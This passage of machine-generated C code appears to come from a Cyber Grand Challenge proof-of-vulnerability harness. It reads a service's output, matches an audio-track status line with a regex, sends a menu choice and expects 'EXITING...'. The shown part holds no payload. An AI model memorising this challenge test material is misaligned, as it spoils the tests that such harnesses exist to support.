      //**** delimited read
      static unsigned char read_00025_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00025 = NULL;
      read_00025_len = 0;
      int read_00025_res = cgc_delimited_read(0, &read_00025, &read_00025_len, read_00025_delim, 4);
      if (read_00025_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00025_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00025_00000_match;
      pcre *read_00025_00000_pcre = cgc_init_regex(read_00025_00000_regex);
      if (read_00025_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00025_00000_pcre, 0, read_00025 + read_00025_ptr, read_00025_len - read_00025_ptr, &read_00025_00000_match);
         if (rc > 0) {
            read_00025_ptr += read_00025_00000_match.match_end - read_00025_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00025_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00025);
      if (read_00025_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x39\x0a";
      static unsigned int write_00012_00000_len = 2;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = cgc_append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         cgc_transmit_all(1, write_00012, write_00012_len);
      }
      cgc_free(write_00012);
   } while (0);
   do {
      unsigned char *read_00026;
      unsigned int read_00026_len;
      unsigned int read_00026_ptr = 0;
      //**** delimited read
      static unsigned char read_00026_delim[] = 
         "\x0a";
      read_00026 = NULL;
      read_00026_len = 0;
      int read_00026_res = cgc_delimited_read(0, &read_00026, &read_00026_len, read_00026_delim, 1);
      if (read_00026_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00026_00000[] = 
         "\x45\x58\x49\x54\x49\x4e\x47\x2e\x2e\x2e\x0a";
      read_00026_ptr += cgc_data_match(read_00026 + read_00026_ptr, read_00026_len - read_00026_ptr, match_00026_00000, 11);
      cgc_free(read_00026);
      if (read_00026_ptr) {}  //silence unused variable warning if any
   } while (0);
}
